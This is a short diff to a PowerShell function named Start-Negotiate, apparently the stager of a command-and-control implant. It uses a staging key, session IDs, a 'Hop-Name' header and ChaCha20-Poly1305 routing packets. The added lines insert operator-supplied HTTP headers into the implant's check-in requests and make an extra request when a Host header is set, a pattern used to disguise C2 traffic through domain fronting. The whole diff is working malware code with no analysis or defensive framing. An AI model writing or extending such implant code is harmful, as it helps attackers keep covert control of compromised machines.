@@ -652,6 +652,14 @@ function Start-Negotiate {
     if ($Script:Proxy) { $wc.Proxy = $Script:Proxy }
     $wc.Headers.Clear()
     $wc.Headers.Add('User-Agent', $UA)
+    if($Script:Headers){
+        $Script:Headers.GetEnumerator() | ForEach-Object {
+            if($_.Name.ToLower() -eq 'host'){
+                try{ $ig = $wc.DownloadData($s) } catch { }
+            }
+            $wc.Headers.Add($_.Name, $_.Value)
+        }
+    }
 
     # session id (8 bytes ASCII)
     $ID='00000000'
@@ -725,6 +733,14 @@ function Start-Negotiate {
     $wc.Headers.Clear()
     $wc.Headers.Add('User-Agent', $UA)
     $wc.Headers.Add('Hop-Name', $hop)
+    if($Script:Headers){
+        $Script:Headers.GetEnumerator() | ForEach-Object {
+            if($_.Name.ToLower() -eq 'host'){
+                try{ $ig = $wc.DownloadData($s) } catch { }
+            }
+            $wc.Headers.Add($_.Name, $_.Value)
+        }
+    }
 
     # stage_2: ChaCha20-Poly1305 routing with AES/HMAC(SessionKey) body
     $chachaPkt2 = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 3 -Additional 0 -EncData $eb2
